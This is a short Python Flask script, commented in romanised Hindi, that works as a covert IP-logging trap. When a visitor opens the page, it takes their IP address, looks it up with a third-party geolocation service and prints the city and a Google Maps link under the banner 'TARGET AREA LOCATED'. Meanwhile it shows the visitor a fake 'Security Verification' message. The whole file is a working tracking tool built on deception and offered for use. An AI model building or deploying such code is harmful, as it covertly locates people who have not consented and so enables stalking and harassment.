from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/')
def home():
    # Target ka IP nikalna
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    try:
        # IP se exact coordinates nikalna
        data = requests.get(f'https://ipapi.co/{ip}/json/').json()
        lat = data.get('latitude')
        lon = data.get('longitude')
        city = data.get('city', 'Unknown')
        
        # Asli Google Map link banana jo area dikhaye
        if lat and lon:
            map_link = f"https://www.google.com/maps?q={lat},{lon}"
        else:
            map_link = "Coordinates not found"
            
    except:
        city = "Error"
        map_link = "Service Error"

    print(f"\n--- [!!!] TARGET AREA LOCATED [!!!] ---")
    print(f"IP: {ip} | City: {city}")
    print(f"Google Maps Area: {map_link}\n")
    
    return "<h2>Security Verification...</h2><p>Checking connection stability, please wait.</p>"

